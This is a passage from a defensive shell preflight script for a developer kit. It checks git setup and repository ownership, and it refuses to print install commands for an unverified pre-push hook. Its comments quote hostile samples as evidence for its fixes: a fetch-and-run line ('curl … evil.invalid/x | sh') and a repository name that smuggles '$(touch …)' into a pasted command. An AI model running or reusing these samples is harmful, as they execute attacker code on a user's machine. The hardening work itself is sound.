  _gk=$(mktemp -d); sed '/# MUT-GPEXIT$/s/exit 0/exit 3/' "$_self" > "$_gk/preflight.sh"
  if cmp -s "$_self" "$_gk/preflight.sh"; then echo "FAIL: mutant GP21-exit-moves did not apply"; fail=1
  else
    _gp_run "$_gp_gp1" "$_gk/preflight.sh"
    if [ "$_gp_rc" -ne 0 ]; then echo "PASS: mutant GP21-exit-moves is killed (rc $_gp_rc)"; else echo "FAIL: mutant GP21-exit-moves survived"; fail=1; fi
  fi
  rm -rf "$_gk"
  # GP22: an unreadable subtree is UNVERIFIED, not cleared (skipped as root, which reads everything)
  _gp_repo gp22; mkdir -p "$_gp_d/d1"; chmod 000 "$_gp_d/d1"
  if [ -r "$_gp_d/d1" ]; then echo "PASS: git-plants [GP22] (this user reads a mode-000 directory, so the case cannot be built here: not exercised)"
  else
    _gp_run "$_gp_d"; _gp_has GP22 "UNVERIFIED: some paths could not be read" "an unreadable subtree says UNVERIFIED"
    if [ "$_gp_rc" -eq 0 ]; then echo "PASS: git-plants [GP22b] and the exit is unchanged"; else echo "FAIL: git-plants [GP22b] rc $_gp_rc"; fail=1; fi
    chmod 755 "$_gp_d/d1"
  fi
  # SWAS-793: the main run prints the checkout report and counts its `  warn git-plants:` lines into gpwarn (gp_count_warns), for the summary line only. A seam run with ONE plant (a
  # core.hooksPath that points inside the checkout) must count 1, and a clean repository 0 (so the 1 is not a constant). The report is read from the fixture in a subshell, as the main run reads it.
  _gpc_n() {  # <dir> [mutated copy of this script] -> gp_count_warns of that directory's report
    ( cd "$1" || exit 1
      [ -z "${2:-}" ] || eval "$(sed -n '/^gp_count_warns() {/,/^}/p' "$2")"
      gp_count_warns "$(check_git_plants)" )
  }
  _gp_repo gpc0; _gpc0=$_gp_d
  _gp_repo gpc1; _gp_g -C "$_gp_d" config core.hooksPath .husky; _gpc1=$_gp_d
  _gpc_a=$(_gpc_n "$_gpc0") || _gpc_a="<aborted>"; _gpc_b=$(_gpc_n "$_gpc1") || _gpc_b="<aborted>"
  if [ "$_gpc_a" = 0 ] && [ "$_gpc_b" = 1 ]; then echo "PASS: swas-793 [gpwarn-counts] a clean repository counts 0 git-plants warnings and one plant counts 1"; else echo "FAIL: swas-793 [gpwarn-counts] clean '$_gpc_a' (expected 0), one plant '$_gpc_b' (expected 1)"; fail=1; fi
  # mutant gpwarn-count-dropped: the counter no longer matches the warning prefix in a copy, so the one-plant run must read 0 where the original reads 1.
  _gk=$(mktemp -d); sed "/# MUT-GPCOUNT\$/s/'\\^  warn git-plants:'/'^  NOPE git-plants:'/" "$_self" > "$_gk/preflight.sh"
  if cmp -s "$_self" "$_gk/preflight.sh"; then echo "FAIL: mutant gpwarn-count-dropped did not apply (the sed expression matched nothing)"; fail=1
  elif ! sh -n "$_gk/preflight.sh" 2>/dev/null; then echo "FAIL: mutant gpwarn-count-dropped does not parse (a mutant that cannot run would read as killed)"; fail=1
  else
    _gpc_m=$(_gpc_n "$_gpc1" "$_gk/preflight.sh") || _gpc_m="<aborted>"
    case "$_gpc_m" in
      0) echo "PASS: mutant gpwarn-count-dropped is killed (the plant counts 0)" ;;
      1) echo "FAIL: mutant gpwarn-count-dropped survived (the plant still counts 1)"; fail=1 ;;
      *) echo "FAIL: mutant gpwarn-count-dropped never ran the plant fixture (vacuous: '$_gpc_m')"; fail=1 ;;
    esac
  fi
  rm -rf "$_gk"
  rm -rf "$_gp_t"

  rm -rf "$_bnd" "$_pr_t" "$_pr_xp"

  [ "${_pf_skips:-0}" -eq 0 ] || echo "NOTE: preflight selftest: ${_pf_skips} SKIP (coverage WEAK)"
  [ "$fail" -eq 0 ] && { echo "OK: preflight selftest"; exit 0; } || { echo "FAIL: preflight selftest"; exit 1; }
fi

if [ "$GIT_PLANTS_ONLY" -eq 1 ]; then
  check_git_plants
  exit 0   # MUT-GPEXIT
fi

if [ "$BOUNDARY_ONLY" -eq 1 ]; then
  check_boundary
  if [ "$BOUNDARY_ADVISORY" -eq 1 ]; then exit 0; fi
  if [ "$bfail" -ne 0 ]; then exit 1; fi
  if [ "$bunv" -ne 0 ]; then exit 2; fi
  exit 0
fi

# SWAS-784 / SWAS-785: which tree is this? The first act of the main body, so nothing is reported before it. kit: say so first, run as today, end without the all-clear
# (exit unchanged, nothing sets miss). other: refuse before any report line (exit 1, nothing written). export and incepted: unchanged. A marker list that cannot be read
# refuses (the class would otherwise read the kit as an export).
_prc_rc=0
PROJECT_CLASS=""; _prc_anchor=$PWD
project_root_resolve || _prc_rc=$?
if [ "$_prc_rc" -ne 0 ]; then
  printf '%s\n' "preflight: cannot read the kit-internal marker list in $(prc_show "$(dirname -- "$0")/incept.sh"); reinstall the kit scripts" >&2
  exit 1
fi
[ "$PROJECT_CLASS" != other ] || prc_refuse_other   # MUT-PROTHER
[ "$PROJECT_CLASS" != kit ] || printf '%s\n' "preflight: this is the Sparkwright kit checkout ($(prc_show "$_prc_anchor")), not your project. The checks below describe the kit. To check your project, export the kit and run preflight there: sh scripts/adopter-export.sh <dir>"   # MUT-PRKITNOTICE

echo "Sparkwright — preflight"
echo "Universal prerequisites:"
need jq  "brew install jq | apt-get install jq | dnf install jq"
need git "git-scm.com/downloads"
need sh  "any POSIX shell"
echo "Checkout git (parse-only; reported after the fact):"
_gpo=$(check_git_plants)   # SWAS-793: captured, printed as before, and its warnings counted for the summary line (display only)
printf '%s\n' "$_gpo"
gpwarn=$(gp_count_warns "$_gpo")
echo "Git capability, sandbox and boundary:"
check_git_capability
check_sandbox
check_boundary
check_guard_killswitch

echo "Recommended (GitHub-based flows — skip on GitLab/ADO):"
recommend gh "GitHub CLI — needed for the branch-protection setup at Inception (cli.github.com)"
if command -v gh >/dev/null 2>&1; then
  # SWAS-945: inside the macOS agent sandbox a bare `gh auth status` reads a valid token as invalid (x509 OSStatus -26276). The kit's own reader sets its own trust store
  # (scripts/gh-tls.sh; one probe, here in the parent shell, before the first gh read: this auth read and the repo-class read below). A missing library means no probe.
  _pf_ghtls=$(dirname -- "$0")/gh-tls.sh
  # shellcheck source=scripts/gh-tls.sh
  if [ -f "$_pf_ghtls" ]; then . "$_pf_ghtls"; fi
  if command -v kit_gh_tls_pin >/dev/null 2>&1; then kit_gh_tls_pin; fi
  # shellcheck disable=SC2034  # rec mirrors miss for recommended tools; warnings don't fail the run
  if gh auth status >/dev/null 2>&1; then echo "  ok   gh auth (logged in)"; else echo "  warn gh auth — run 'gh auth login' before the branch-protection step"; rec=$((rec + 1)); fi
fi

if git_env_redirected; then
  echo "" >&2
  echo "ERROR: your git environment redirects git away from this directory." >&2
  # printf '%s\n', not echo — RULE 3 (see the K11 refusal block below), applied to the CLASS rather than
  # to the one instance that was reported. These lines also carry attacker-shaped paths into a security
  # refusal's output, under the same dash-expands-backslash-escapes mechanism, and were written before
  # the rule existed. Not K11's own surface, but the same defect: a rule applied to one of its instances.
  [ -n "${GIT_DIR:-}" ]       && printf '%s\n' "  GIT_DIR=$GIT_DIR" >&2
  [ -n "${GIT_WORK_TREE:-}" ] && printf '%s\n' "  GIT_WORK_TREE=$GIT_WORK_TREE" >&2
  echo "  preflight would report on that repository instead of your product." >&2
  echo "  Nothing has been written. Clear the redirect and re-run:" >&2
  echo "    env -u GIT_DIR -u GIT_WORK_TREE sh scripts/preflight.sh ..." >&2
  exit 1
elif git_dir_outside "$PWD" && [ "${ALLOW_NESTED:-0}" -eq 0 ]; then
  _gcd_raw=$( git rev-parse --git-common-dir 2>/dev/null )
  _gcd_show=$( CDPATH='' cd "${_gcd_raw:-.}" 2>/dev/null && pwd -P )
  [ -n "$_gcd_show" ] || _gcd_show=$_gcd_raw
  echo "" >&2
  echo "ERROR: this directory's git dir lives outside it (nested dir, submodule, or linked worktree)." >&2
  printf '%s\n' "  git dir: $_gcd_show  — the pre-push hook would land in that shared/other repo." >&2   # Rule 3
  echo "  If this is intentional, re-run with:  sh scripts/preflight.sh --allow-nested ..." >&2
  exit 1
fi

# CP-4: refuse before reporting on a repository we do not own. Nested in a foreign worktree,
# every line below would describe the PARENT's repo — a wrong answer stated confidently.
if ! owns_itself "$PWD" && [ "$ALLOW_NESTED" -eq 0 ]; then
  _parent=$(owning_repo_root "$PWD")
  echo "" >&2
  echo "ERROR: this directory is not the root of its own git repository." >&2
  printf '%s\n' "  cwd:      $(pwd -P)" >&2                    # Rule 3
  printf '%s\n' "  owned by: $_parent  (git toplevel)" >&2      # Rule 3
  echo "" >&2
  echo "Everything preflight reports below — remote, repo class, CODEOWNERS, workflows — would" >&2
  echo "describe THAT repository, not your product. Run preflight from the root of its own repo." >&2
  echo "If this nesting is intentional (e.g. a monorepo package), re-run with --allow-nested." >&2
  exit 1
fi

# SWAS-934: the run-env leg, after the CP-11 and CP-4 refusals (a tree we do not own is never judged) and before K11. N/A (no line) without .kit-run/run-env.names; a plain-run FAIL sets miss, so the closing exit carries it.
check_run_env

# K11 (CP7R5) — THE CALL SITE. Deliberately DOWNSTREAM of the CP-11 git-dir refusal and the CP-4
# ownership refusal above: we must not pass judgment on a repository we do not own, and both of those
# blocks `exit 1` before reaching here. Upstream of `is_github_repo` because the guard is a property of
# the LOCAL clone — it is equally missing on GitLab, on ADO, and on a repo with no remote at all.
#
# --allow-nested (MEASURED 2026-07-21, not assumed): that flag suppresses BOTH refusals above, so under
# it this check can run in a tree whose git dir belongs to an enclosing repository. It still judges, and
# that is the considered decision, not an oversight — a LINKED WORKTREE trips the CP-11 refusal too
# (measured: rc 1 without the flag, rc 0 with it), so --allow-nested is the ONLY way a real run reaches
# this check from a worktree. Going silent there would leave legs W1/W2/H3 — the whole worktree lane —
# correct and never executed, which is the same defect class this call site exists to close. Residual,
# named rather than absorbed: under --allow-nested the refusal can describe the ENCLOSING repository.
# It is read-only, every path it prints is absolute, and CP-4's own message already states that the
# report describes THAT repository. Locked by leg MP5.
check_guard_installed

if is_github_repo; then
  echo "Adopter environment (GitHub repo detected):"
  check_repo_class
  check_codeowners_placeholders
  check_workflows_valid
fi

if [ -n "$STACK" ]; then
  printf '%s\n' "Stack toolchain ($STACK):"   # Rule 3 — $STACK is raw argv
  if tools=$(stack_tools "$STACK"); then
    # Split "tool|hint" lines with IFS local to `read` (no global IFS mutation), fed via a
    # here-doc — a here-doc is a redirection, not a pipe, so the loop runs in THIS shell and
    # the `miss` accumulator propagates (a `| while` pipe would lose it in a subshell).
    while IFS='|' read -r t hint; do
      [ -n "$t" ] || continue
      need "$t" "$hint"
    done <<EOF
$tools
EOF
  else
    printf '%s\n' "  (no toolchain map for '$STACK' — see profiles/$STACK.md)"   # Rule 3
  fi
  # The stack's DECLARED runtime floor, read from the declaration that already exists. Self-gating:
  # a stack that does not run on node prints nothing here.
  check_runtime_floor "$STACK" "profiles/$STACK/scaffold/.nvmrc"
fi

# SWAS-793: the summary names each kind of line it counts, so a reader can match each number to the lines above. The lead is the first non-zero kind (advisory warnings,
# then the boundary's notices, then git-plants warnings); the others follow as "also ...". A kind at 0 is left out, and the whole line when all three are 0. "advisory warning(s) above"
# stays one unbroken substring whenever rec > 0. None of the three counts feeds an exit code.
_sumh=""; _sumx=""
[ "$rec" -le 0 ] || _sumh="$rec advisory warning(s) above"
if [ "$bwarn" -gt 0 ]; then if [ -z "$_sumh" ]; then _sumh="$bwarn boundary notice(s) above"; else _sumx="$bwarn boundary notice(s)"; fi; fi   # MUT-SUMBND
if [ "$gpwarn" -gt 0 ]; then
  if [ -z "$_sumh" ]; then _sumh="$gpwarn git-plant warning(s) above"
  elif [ -z "$_sumx" ]; then _sumx="$gpwarn git-plant warning(s)"
  else _sumx="$_sumx and $gpwarn git-plant warning(s)"; fi
fi
if [ -n "$_sumh" ]; then
  echo ""
  _sumt=""; [ -z "$_sumx" ] || _sumt="; also $_sumx"
  printf '%s\n' "$_sumh — non-blocking (they do not affect this check's result)$_sumt."   # Rule 3
fi

if [ "$RUNTIME_REFUSE" -eq 1 ]; then
  echo "" >&2
  echo "ERROR: unsupported runtime — this stack's DECLARED floor is not met." >&2
  # RULES 1 AND 3, APPLIED TO THIS BLOCK AS A CLASS (finding L-3). The security re-review found ONE
  # survivor of the earlier sweep — the `--stack $STACK` line below, an unquoted variable inside a
  # paste-able command, printed with `echo`. It was not alone, and fixing only the reported instance is
  # the pattern that has generated every finding in this slice. So the whole ERROR block moves:
  #   * `printf '%s\n'`, never `echo`, for every line carrying a variable — dash's builtin echo expands
  #     backslash escapes, and dash IS /bin/sh on the ubuntu-latest runner. `$RUNTIME_FOUND` is
  #     `node --version` output (or a seam's) and `$RUNTIME_SRC` is derived from argv.
  #   * `guard_shq` for every variable inside a RUNNABLE line. `$STACK` is raw argv. `$RUNTIME_FLOOR` is
  #     digits-by-construction today (node_major's closing `case` rejects anything else) and is quoted
  #     ANYWAY, deliberately: guard_shq's own note says a helper that is only correct because of a
  #     caller's precondition is the defect class this fix-loop exists to close, and that applies to a
  #     CALL SITE resting on a distant sanitiser just as much. The cost is a cosmetically quoted number
  #     in the fix line; the benefit is that no future change to read_runtime_floor can reopen this.
  printf '%s\n' "  running:  node $RUNTIME_FOUND" >&2
  printf '%s\n' "  required: node >= $RUNTIME_FLOOR   (declared in $RUNTIME_SRC)" >&2
  echo "" >&2
  echo "  Refusing HERE, where it is legible. Below the floor, 'npm ci' refuses (engine-strict) and a" >&2
  echo "  partial install fails deep inside a dependency — CP-7's cold run hit 'node:util.styleText'" >&2
  echo "  inside Rolldown, which reads as anything except a Node version problem." >&2
  echo "" >&2
  printf '%s\n' "  Fix:  nvm install $(guard_shq "$RUNTIME_FLOOR") && nvm use $(guard_shq "$RUNTIME_FLOOR")    (or install Node $RUNTIME_FLOOR from nodejs.org)" >&2
  echo "  If this runtime is deliberate, re-run with the escape and accept that it is unsupported:" >&2
  printf '%s\n' "    sh scripts/preflight.sh --stack $(guard_shq "$STACK") --allow-runtime-mismatch" >&2
  exit 1
fi

# K11 (CP7R5) — THE REFUSAL. Same shape as the RUNTIME_REFUSE block above (legible ERROR, the cause, a
# paste-able fix, exit 1) and placed immediately after it, before the `miss` check, for the same reason
# that block is: these are STATE refusals about the tree, and they are more specific than "a tool is
# missing" — the per-tool `MISS` lines are already printed above, so nothing is hidden by refusing here.
#
# ADDRESSED TO A HUMAN (design §4.5). `.git/` is in the guard's control-plane set, so an agent seat is
# denied the install and a message telling an agent to fix this would be un-actionable by its reader.
#
# DOWNSTREAM INTERACTION WITH incept.sh — MEASURED, not reasoned (finding J9, T2 fix-loop, 2026-07-21).
# scripts/incept.sh runs `sh scripts/preflight.sh` as a HARD precondition (grep `incept: missing
# prerequisites`). It used to run it BEFORE its own already-incepted refusal (grep `already incepted`), so this
# block CHANGED WHICH MESSAGE incept printed when it was re-run in an already-incepted tree whose guard was
# missing. Differential measured on two fixtures identical except for `.git/hooks/pre-push`:
#     guard ABSENT    -> "incept: missing prerequisites. Run 'sh scripts/preflight.sh' ... Aborting."  rc 1
#     guard INSTALLED -> "error: ENGINEERING-PRINCIPLES.md exists — already incepted. Aborting."        rc 1
# That ordering was a disclosed cost, and SWAS-784 retires it: incept's tree checks (already incepted, the principles
# CLAUDE.md, the kit-internal markers) now run AHEAD of the preflight call, so the already-incepted tree gets its
# specific sentence whatever its guard, and a directory that is no un-incepted export gets incept's own sentence naming
# the cwd instead of the generic line. No refusal was loosened: only their order and one message changed. Locked by
# conformance/incept-containment.sh (IC-OTHER).
#
# THE THREE OUTPUT RULES, STATED ONCE AND APPLIED EVERYWHERE IN THIS BLOCK. Every finding this block
# collected in the final fix-loop was a PARTIAL application of a rule already written down here, so the
# rules are numbered, implemented as helpers with one definition each, and cited at each use:
#   1. guard_shq   — POSIX-quote every path that enters a paste-able COMMAND. Double quotes do not
#                    neutralise `$(…)`; a repo named `pkg$(touch …/PWNED)x` executed on paste (measured).
#   2. guard_path_hostile — REJECT control characters before printing, at the top of
#                    check_guard_installed. `printf '%s\n'` stops backslash escapes and nothing else; a
#                    LITERAL newline forged a whole `cp … && chmod +x …` block inside the branch below
#                    whose purpose is to refuse one (measured).
#   3. printf '%s\n', never `echo`, for every line carrying a variable — dash's builtin echo expands
#                    backslash escapes, and dash IS /bin/sh on the ubuntu-latest runner.
# Rules 2 and 3 are BOTH required and neither subsumes the other: `[[:cntrl:]]` does not match the
# two-character sequence `\` `n` (measured in sh/dash/bash), and printf does not stop a real newline.
if [ "$GUARD_REFUSE" -eq 1 ]; then
  # ABSOLUTIZE THE SOURCE TOO. T1 absolutized the DESTINATION ($GUARD_HOOK, locked by leg W3) because
  # `--git-path` answers relative to the cwd — but the source half of this command, `hooks/pre-push`, is
  # repo-root-relative, so pasted from any subdirectory it names a file that is not there. Half an
  # absolute command is still a broken paste, which is the §4.5 defect W3 closed surviving in the other
  # half of the same line. NOT `--path-format=absolute`: that landed in git 2.31 while this script's git
  # floor (:36-37) is WARN-AND-DEGRADE rather than a requirement, so an older git must still get a
  # correct answer instead of "unknown option". `cd` + `pwd -P` is version-agnostic and physical — the
  # same form $GUARD_HOOK carries, so the two halves of the command agree. Locked by legs MP1 and MP5.
  # Unresolvable => leave it relative: strictly no worse than before, and never an invented path.
  _g_src="hooks/pre-push"
  _g_top=$(git rev-parse --show-toplevel 2>/dev/null) || _g_top=""
  _g_abs=""
  if [ -n "$_g_top" ]; then
    _g_abs=$( CDPATH='' cd -- "$_g_top" 2>/dev/null && pwd -P ) || _g_abs=""
    [ -z "$_g_abs" ] || _g_src="$_g_abs/hooks/pre-push"
  fi
  # RULE 2 ON THE SOURCE HALF TOO. check_guard_installed already rejected a hostile $GUARD_HOOK, but
  # $_g_src is derived from a DIFFERENT root (`--show-toplevel`, i.e. the WORKTREE) and in a linked
  # worktree the two can differ: a clean main `.git` with a hostile worktree path reaches here with
  # GUARD_HOOK safe and _g_src not. Testing only the one that had already been fixed is precisely the
  # partial-application pattern this fix-loop exists to close. Locked by leg E4.
  _g_hostile=0
  guard_path_hostile "$_g_src" && _g_hostile=1
  # OWNERSHIP OF THE SOURCE (finding X1, part 1). An install command names a file this script is telling
  # a human to make EXECUTABLE inside `.git/hooks/`. Offering one is only defensible for a tree the
  # operator asserted ownership of — and `--show-toplevel` != `$PWD` means they did not: CP-4 and CP-11
  # both refuse that shape, so the ONLY way to reach here with the two differing is `--allow-nested`,
  # under which the source named is the ENCLOSING repository's hook. REPRODUCED cross-repo: the trusted
  # kit's preflight vouched for a foreign repo's `hooks/pre-push`, a genuine trust-boundary crossing,
  # made worse by `hooks/pre-push` having no CODEOWNERS rule (so it is PR-modifiable).
  # NO SIGNAL DISTINGUISHES the benign monorepo-subdirectory case from the hostile enclosing-repo case
  # — both are exactly "cwd is not the toplevel" — so this fails safe and SIGNPOSTS the recovery
  # (re-run from the repo root) rather than relaxing. The check still JUDGES; only the command is
  # withheld. Locked by leg MP5 (rewritten from asserting the command IS printed to asserting it is
  # NOT) and MP11.
  _g_owned=1
  _g_pwd=$(pwd -P 2>/dev/null) || _g_pwd=""
  if [ -z "$_g_abs" ] || [ -z "$_g_pwd" ] || [ "$_g_abs" != "$_g_pwd" ]; then _g_owned=0; fi
  echo "" >&2
  echo "ERROR: this repository's pre-push runtime guard is not in force." >&2
  # THE `hook:` LINE IS SUPPRESSED FOR EXACTLY ONE STATE, rather than that state getting an early
  # `exit 1` of its own. An early exit would need its own copy of the closing ceiling paragraph, and two
  # copies of a disclosure is how one of them goes stale — which is the Y2 finding one level up. One
  # ceiling, one lock, every state falls through to it.
  if [ "$GUARD_STATE" != hostile-path ]; then printf '%s\n' "  hook: $GUARD_HOOK" >&2; fi
  case "$GUARD_STATE" in
    hostile-path)
      # The one state that must print NO path at all — printing it is the attack (Rule 2).
      echo "  This repository's path (or its core.hooksPath) contains a CONTROL CHARACTER — a newline or" >&2
      echo "  similar. Nothing here will echo it: a path carrying a newline forges whole lines into this" >&2
      echo "  message, including a fake install command. Rename the directory (or fix .git/config), then" >&2
      echo "  re-run. No command is offered and no path is printed while that is true." >&2 ;;
    absent)
      echo "  git clones neither .git/hooks/ nor .git/config, so a FRESH CLONE of an incepted repo has" >&2
      echo "  no local guard at all: force-push and push-to-main are unblocked in this working copy." >&2
      echo "" >&2
      # THE SOURCE IS SHOWN TO A HUMAN, NEVER VOUCHED FOR (findings J2 then X1). The T2 fix-loop added a
      # `guard_is_kit_hook "$_g_src"` gate here and treated a TRUE as verification. It is not: the
      # predicate is `grep -q KIT_GUARD_CORE`, a SUBSTRING test on a public token, and a hostile hook
      # carrying it in a COMMENT plus `curl -s http://evil.invalid/x | sh` received the full vouched
      # `cp … && chmod +x …` (measured 2026-07-21). MP7 passed only because its fixture omitted the
      # token — it modelled an attacker who did not try. Overclaiming a control is itself the defect, so
      # the vouch is withdrawn rather than strengthened: no shell-script test can establish that an
      # arbitrary file is the kit's guard, and pretending otherwise is what made the refusal dangerous.
      #
      # What replaces it, in the order a human needs it:
      #   1. OWNERSHIP  — no command at all for a tree the operator did not assert ownership of ($_g_owned).
      #   2. FIRST FILTER — guard_is_kit_hook may still REJECT (no marker / missing / unreadable). Cheap,
      #                    dispositive in one direction only, and it keeps MP7/MP8 meaningful.
      #   3. EVIDENCE   — a REFERENCE to the file (path + sha256 + how to inspect it), never a rendering
      #                    of it. See Rule 4 where guard_excerpt used to be: the T3 revision of this list
      #                    said "the sha256 and a rendered-inert excerpt", and that excerpt was the
      #                    security re-review's BLOCK (H-1). A verdict that displays attacker-controlled
      #                    content is forgeable by RENDERING however clean its bytes are filtered.
      #   4. WORDING    — "inspect this file; if it IS the kit's guard, run:". The command is offered as
      #                    conditional on the human's judgment, which is the only verifier in the loop.
      # The path is always NAMED (the operator needs to know which file is meant) but only ever as a
      # labelled fact; every path inside a runnable line goes through guard_shq (Rule 1).
      # Locked by legs MP7 (filter rejects), MP8 (absent source), MP10 (a forged marker gets no vouch),
      # MP11/MP5 (unowned tree gets no command) and Q1 (the emitted line is injection-inert).
      if [ "$_g_hostile" -eq 1 ]; then
        echo "  NO INSTALL COMMAND IS OFFERED. This tree's own path contains a control character, so the" >&2
        echo "  source path cannot be printed without forging lines into this message. Rename it, re-run." >&2
      elif [ "$_g_owned" -eq 0 ]; then
        # W-1: THE HONEST LIMITATION, WITHOUT THE ACCUSATION. The T3 wording told the reader the tree was
        # "not a tree you asserted ownership of" — accurate about what the CHECK knows, and an insult to
        # the overwhelmingly common case, which is a developer in a monorepo package. The check cannot
        # tell that case from a run inside someone else's repository, so it says exactly that and stops.
        # A refusal a legitimate user reads as a suspicion is a refusal they learn to route around.
        echo "  NO INSTALL COMMAND IS OFFERED — a limit of what this check can KNOW, not a judgment about" >&2
        echo "  you. preflight is running below the root of its repository (only --allow-nested gets" >&2
        echo "  here), so the 'hooks/pre-push' it can see belongs to the ENCLOSING repository. That is the" >&2
        echo "  ordinary shape of a monorepo package — and it is also the shape of a run inside a" >&2
        echo "  repository someone else controls. From here those two are indistinguishable, so nothing" >&2
        echo "  is offered that would make a file from another repository executable inside .git/hooks/." >&2
        printf '%s\n' "    hook source not offered from: $_g_src" >&2
        echo "  Re-run preflight from that repository's own root and the install command comes back." >&2
      elif [ ! -f "$_g_src" ] || ! guard_is_kit_hook "$_g_src"; then
        # `[ ! -f ]` FIRST, AND IT IS NOT COSMETIC ORDERING (finding LOW-2). Everything downstream of
        # here READS the source to EOF — `grep -q` in guard_is_kit_hook, then the hasher in guard_sha256
        # — and a source that is not a regular file may have no EOF. MEASURED (2026-07-21): with
        # `hooks/pre-push` a FIFO with no writer, or a symlink to /dev/zero, the whole script blocked on
        # `grep -q KIT_GUARD_CORE` and never terminated; under a 20 s alarm rc 142, output stopped after
        # the "no local guard at all" line. Symlinks are tracked git content, so a PR introduces this and
        # stalls every CI job that runs preflight until the job timeout — a gate that hangs reports
        # nothing and burns the runner, which is strictly worse than a gate that reds.
        # THE DESTINATION SIDE ALREADY DID THIS (`[ ! -f "$GUARD_HOOK" ]` in check_guard_installed); the
        # source side simply never got the same test. Testing only the half that had already been fixed
        # is the partial-application pattern this whole fix-loop exists to close.
        # `-f` FOLLOWS SYMLINKS, which is what is wanted: the question is what the source IS, not how it
        # is reached, and an ordinary symlinked source (the L-2 fixture) stays supported.
        # ONE TEST COVERS BOTH UNBOUNDED READS because the digest is only ever reached on the `else`
        # branch this condition guards — stated rather than implied, since that is a dependency a future
        # edit could break by moving guard_sha256 earlier.
        # A NON-REGULAR SOURCE FALLS IN HERE RATHER THAN GETTING ITS OWN ARM: the answer is identical
        # (no command, name the file, say why) and a second near-duplicate arm is how one of the two goes
        # stale — the Y2 finding. The parenthetical below is widened so the message is TRUE for the state
        # it now covers. Locked by leg MP13, whose mutant does not fail — it HANGS.
        echo "  NO INSTALL COMMAND IS OFFERED. This tree's hooks/pre-push does not even carry the kit's" >&2
        echo "  KIT_GUARD_CORE marker (it is missing, NOT A REGULAR FILE, unreadable, or unmarked), so it" >&2
        echo "  fails the cheapest filter there is — and a 'cp' line for an unchecked script is how a" >&2
        echo "  refusal becomes the attack." >&2
        printf '%s\n' "    rejected source: $_g_src" >&2
        echo "  Re-export the kit (adopter-export.sh) to restore it, then re-run this check." >&2
      else
        # NOT A VOUCH — say so before naming anything, so the path and digest are read as evidence for
        # the human's decision rather than as this script's conclusion. NOTHING OF THE FILE'S CONTENT IS
        # PRINTED: see Rule 4 where guard_excerpt used to be (finding H-1). The file is REFERENCED —
        # path, digest, and the tools that can actually discriminate — and the reader is sent to it.
        echo "  A CANDIDATE SOURCE EXISTS, AND NOTHING HERE HAS VERIFIED IT. It carries the KIT_GUARD_CORE" >&2
        echo "  marker, but that marker is a public substring anyone can put in a comment — it can reject a" >&2
        echo "  file, it cannot vouch for one. YOU are the verifier, and none of that file's CONTENT is" >&2
        echo "  shown here on purpose: a preview inside a security verdict can be made to render as" >&2
        echo "  anything, and a payload one line past it is invisible. Go and read it:" >&2
        printf '%s\n' "    source:  $_g_src" >&2
        # L-2: a SYMLINKED source's origin is otherwise masked. The path above reads as an in-tree file
        # even when it points outside the repository entirely; the digest and any inspection describe the
        # TARGET, so nothing was forged — but the reader was being handed the wrong provenance. The link
        # target is filesystem content, i.e. attacker-controlled, so RULE 2 applies to it exactly as it
        # does to any other path this block prints, and RULE 1 to the copy inside the `less` line below.
        # `readlink` is not in POSIX; it degrades the way guard_sha256 does — a stated absence, never a
        # blank where a fact belongs.
        _g_lnk=""
        if [ -h "$_g_src" ]; then
          if command -v readlink >/dev/null 2>&1; then
            _g_lnk=$(readlink -- "$_g_src" 2>/dev/null) || _g_lnk=""
            case "$_g_lnk" in
              ''|/*) : ;;
              *) _g_lnk="$(dirname -- "$_g_src")/$_g_lnk" ;;
            esac
            [ -z "$_g_lnk" ] || _g_lnk=$(guard_resolve_deep "$_g_lnk") || _g_lnk=""
          fi
          if [ -z "$_g_lnk" ]; then
            echo "    NOTE:    that path is a SYMLINK; its target could not be resolved here (no readlink" >&2
            echo "             on PATH, or an unresolvable target). The digest below describes the TARGET." >&2
          elif guard_path_hostile "$_g_lnk"; then
            echo "    NOTE:    that path is a SYMLINK whose target contains a CONTROL CHARACTER — it is NOT" >&2
            echo "             printed here (Rule 2). Resolve it yourself before trusting anything below." >&2
          else
            printf '%s\n' "    SYMLINK: it points at $_g_lnk — that is the file the digest describes," >&2
            echo "             not the in-tree path it looks like." >&2
          fi
        fi
        _g_sum=$(guard_sha256 "$_g_src")
        if [ -n "$_g_sum" ]; then
          printf '%s\n' "    sha256:  $_g_sum" >&2
        else
          echo "    sha256:  (no shasum/sha256sum on PATH — compare the file by hand)" >&2
        fi
        # THE AFFORDANCES, not a preview. These are the two things that can actually discriminate a kit
        # guard from a hostile look-alike, and both are the reader's own tools running under the reader's
        # own terminal, where they can page, search and see the WHOLE file. Rule 1 quotes the path; the
        # `git log -p` form needs none — `_g_owned` is 1 on this branch, so the cwd IS the repository
        # root and `hooks/pre-push` is the correct repo-relative pathspec there.
        printf '%s\n' "    inspect: less $(guard_shq "$_g_src")        # the WHOLE file, not a preview" >&2
        echo "             git log -p -- hooks/pre-push     # who changed it, and when" >&2
        # THE TOCTOU IS DISCLOSED, NOT PRETENDED AWAY. Nothing here can hold the file still between this
        # digest and the paste below, so the message says so instead of implying the digest is a lock.
        echo "  Then re-check: re-run this digest immediately before you paste the command below — the" >&2
        echo "  file can change between the two, and nothing here can prevent that." >&2
        echo "" >&2
        echo "  If — and only if — that IS the kit's guard, a HUMAN can run this (.git/ is control-plane," >&2
        echo "  so an agent seat is denied it):" >&2
        # mkdir -p FIRST, matching scripts/incept.sh's guard-install block, which performs it before the identical
        # `cp … && chmod +x`. Same edge as Y1: `.git/hooks` is not guaranteed to exist (an empty
        # --template creates a repo without it), and a fix line that fails on a legitimate repo teaches
        # the reader the tool is wrong rather than that the tree is.
        printf '%s\n' "    mkdir -p $(guard_shq "$(dirname -- "$GUARD_HOOK")") && cp $(guard_shq "$_g_src") $(guard_shq "$GUARD_HOOK") && chmod +x $(guard_shq "$GUARD_HOOK")" >&2
      fi ;;
    hooks-escape)
      # M-1. The state that supersedes whatever the cascade decided, because whatever the cascade
      # decided, its fix would act OUTSIDE this repository. NO COMMAND — the same answer `dangling`
      # gives, for the same reason, one path component up. The escaped path IS named (the operator
      # cannot fix what they cannot see, and the `hook:` line above already printed it as a labelled
      # fact) but never inside a runnable line.
      echo "  The hooks DIRECTORY for this repository resolves to a location OUTSIDE its git dir — it is" >&2
      echo "  a symlink, or reached through one. git will happily run a hook from there, but every fix" >&2
      echo "  this message could offer (cp, chmod) would create or change an executable outside this" >&2
      echo "  repository, at a path something else controls. That is the escape the dangling-symlink" >&2
      echo "  state refuses one component down, so it is refused here too." >&2
      echo "" >&2
      echo "  NO INSTALL COMMAND IS OFFERED. Inspect that redirection first (a HUMAN must — .git/ is" >&2
